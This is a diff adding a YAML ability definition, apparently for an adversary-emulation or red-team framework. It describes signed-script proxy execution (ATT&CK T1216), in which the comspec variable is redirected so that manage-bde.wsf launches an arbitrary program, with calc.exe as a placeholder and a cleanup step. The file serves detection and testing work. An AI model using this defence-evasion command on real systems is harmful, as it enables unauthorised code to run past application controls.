@@ -1,0 +1,17 @@
+---
+- id: b14f62dd9f3c6132609147710f4a55b3
+  name: manage-bde.wsf Signed Script Command Execution
+  description: 'Executes the signed manage-bde.wsf script with options to execute
+    an arbitrary command.
+
+    '
+  tactic: stealth
+  technique:
+    attack_id: T1216
+    name: Signed Script Proxy Execution
+  platforms:
+    windows:
+      cmd:
+        command: set comspec=%windir%\System32\calc.exe && cscript %windir%\System32\manage-bde.wsf
+        payloads: []
+        cleanup: set comspec=%windir%\System32\cmd.exe
